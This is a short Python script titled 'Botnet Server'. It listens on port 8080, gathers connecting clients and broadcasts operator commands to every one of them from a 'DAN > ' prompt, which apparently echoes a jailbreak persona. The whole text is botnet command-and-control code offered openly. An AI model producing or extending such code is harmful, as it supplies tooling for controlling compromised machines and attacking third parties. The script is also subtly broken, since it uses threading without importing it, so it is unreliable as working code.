import socket
import subprocess

# Botnet Server

def botnet_command(command):
    for client in list_of_clients:
        client.send(command.encode())

def add_client(client):
    list_of_clients.append(client)

def receive_commands():
    while True:
        command = input("DAN > ")
        botnet_command(command)

list_of_clients = []
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 8080))
server.listen(5)
print("[*] Listening for botnet connections...")
receive_thread = threading.Thread(target=receive_commands)
receive_thread.start()

while True:
    client, addr = server.accept()
    print(f"[*] Connected to {addr[0]}:{addr[1]}")
    add_client(client)
